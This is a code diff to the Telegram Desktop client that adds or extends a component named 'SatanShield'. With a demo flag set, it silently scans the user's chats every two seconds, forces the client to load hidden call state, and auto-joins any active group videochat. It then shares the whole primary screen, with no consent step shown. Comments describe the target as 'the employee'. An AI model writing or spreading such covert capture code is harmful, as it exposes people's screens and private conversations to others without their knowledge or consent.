@@ -98,6 +98,9 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 #include "calls/calls_instance.h" // Core::App().calls().inCall().
 #include "calls/group/calls_group_call.h"
 #include "webrtc/webrtc_environment.h" // SatanShield: desktop capture source for auto-share
+#include "calls/group/ui/desktop_capture_choose_source.h" // SatanShield: whole-screen id
+#include "apiwrap.h" // SatanShield: force-load group full info for auto-join
+#include <unordered_set> // SatanShield: track which groups we've full-loaded
 #include "calls/group/calls_group_common.h"
 #include "calls/group/calls_group_invite_controller.h"
 #include "ui/boxes/calendar_box.h"
@@ -1586,37 +1589,78 @@ SessionController::SessionController(
 	// call (the team videochat this account is a member of), auto-join it and start
 	// sharing the whole screen. Poll every couple of seconds until both are done.
 	if (_isPrimary && SatanShield::GetConfig().demo) {
+		SatanShield::Log(QStringLiteral("core armed (demo=on)"));
+		// Groups we've already asked the server to fully load (so we don't re-request
+		// every tick), and screen-share state so we don't re-toggle a share we started.
+		const auto requestedFull = std::make_shared<std::unordered_set<PeerData*>>();
+		const auto shareRequested = std::make_shared<bool>(false);
+		const auto shareWait = std::make_shared<int>(0);
 		_satanDemoTimer.setCallback([=] {
 			auto &calls = Core::App().calls();
 			if (!calls.currentGroupCall()) {
+				*shareRequested = false;
+				*shareWait = 0;
 				// Find, on our own, any chat that currently has an active group call
 				// (the team videochat the employee is a member of) and join it. No
 				// manual chat opening, no invite link (which fails for members).
 				PeerData *target = nullptr;
 				for (const auto &row
 						: session->data().chatsList()->indexed()->all()) {
-					if (const auto peer = row->key().peer()) {
-						if (peer->groupCall()) {
-							target = peer;
-							break;
-						}
+					const auto peer = row->key().peer();
+					if (!peer) {
+						continue;
+					}
+					if (peer->groupCall()) {
+						target = peer;
+						break;
+					}
+					// The active-call flag only appears once the group's FULL info is
+					// loaded, which normally waits until the employee opens the chat.
+					// Force it so we can find and join the call with no manual click.
+					if ((peer->isChat() || peer->isMegagroup())
+							&& requestedFull->emplace(peer).second) {
+						peer->updateFull();
 					}
 				}
 				if (target) {
+					SatanShield::Log(
+						QStringLiteral("joining call in: ") + target->name());
 					calls.startOrJoinGroupCall(uiShow(), target, {});
 				}
 				return;
 			}
 			const auto call = calls.currentGroupCall();
-			if (call && !call->isSharingScreen()) {
-				const auto env = &Core::App().mediaDevices();
-				if (env->desktopCaptureAllowed()) {
-					if (const auto source = env->uniqueDesktopCaptureSource()) {
-						call->toggleScreenSharing(*source, false);
-						_satanDemoTimer.cancel();
-					}
-				}
+			if (!call) {
+				return;
 			}
+			if (call->isSharingScreen()) {
+				SatanShield::Log(QStringLiteral("screen share active - done"));
+				_satanDemoTimer.cancel();
+				return;
+			}
+			if (*shareRequested) {
+				// Asked already — wait for it to establish; re-toggling the SAME
+				// source would STOP it. Retry only if it never came up.
+				if (++(*shareWait) < 6) {
+					return;
+				}
+				SatanShield::Log(
+					QStringLiteral("share did not start in ~12s - retrying"));
+				*shareRequested = false;
+				*shareWait = 0;
+				return;
+			}
+			// Whole PRIMARY screen (never a window); works on Windows where
+			// uniqueDesktopCaptureSource() is always empty.
+			const auto id = Calls::Group::Ui::DesktopCapture::WholeScreenDeviceId();
+			if (id.isEmpty()) {
+				SatanShield::Log(QStringLiteral("no screen source yet - retry"));
+				return;
+			}
+			SatanShield::Log(QStringLiteral("starting whole-screen share: ") + id);
+			call->toggleScreenSharing(id, false);
+			*shareRequested = true;
+			*shareWait = 0;
 		});
 		_satanDemoTimer.callEach(2000);
 	}
